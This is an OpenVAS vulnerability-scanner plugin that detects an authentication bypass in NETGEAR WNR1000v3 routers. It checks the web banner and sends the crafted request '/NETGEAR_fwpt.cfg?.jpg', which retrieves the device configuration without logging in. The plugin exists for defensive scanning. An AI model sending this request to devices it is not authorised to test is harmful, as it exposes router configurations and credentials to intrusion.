##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netgear_wnr1000_authe_bypass_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# NETGEAR WNR1000 'Image' Request Authentication Bypass Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to gain administrative access,
  circumventing existing authentication mechanisms.
  Impact Level: Application";
tag_affected = "NETGEAR WNR1000v3, firmware version prior to 1.0.2.60";


tag_insight = "The web server skipping authentication for certain requests that contain
  a '.jpg' substring. With a specially crafted URL, a remote attacker can
  bypass authentication and gain access to the device configuration.";
tag_solution = "Upgrade to NETGEAR with firmware version 1.0.2.60 or later,
  For updates refer to http://www.netgear.com";
tag_summary = "This host is running with NETGEAR WNR1000 and prone to
  authentication bypass vulnerability.";

if(description)
{
  script_id(803188);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-04-05 18:28:47 +0530 (Fri, 05 Apr 2013)");
  script_name("NETGEAR WNR1000 'Image' Request Authentication Bypass Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.org/91871");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Apr/5");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24916");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121025");
  script_summary("Try to read the content of configuration file");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Privilege escalation");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
banner = "";

## Get HTTP Port
port = get_http_port(default:8080);
if(!port){
  port = 8080;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Get the banner and confirm the application
banner = get_http_banner(port:port);
if("NETGEAR WNR1000" >!< banner){
  exit(0);
}

if(http_vuln_check(port:port, url:"/NETGEAR_fwpt.cfg?.jpg",
   pattern:"Content-type: application/configuration",
   check_header:TRUE, extra_check:"Content-length:"))
{
  security_hole(port:port);
  exit(0);
}
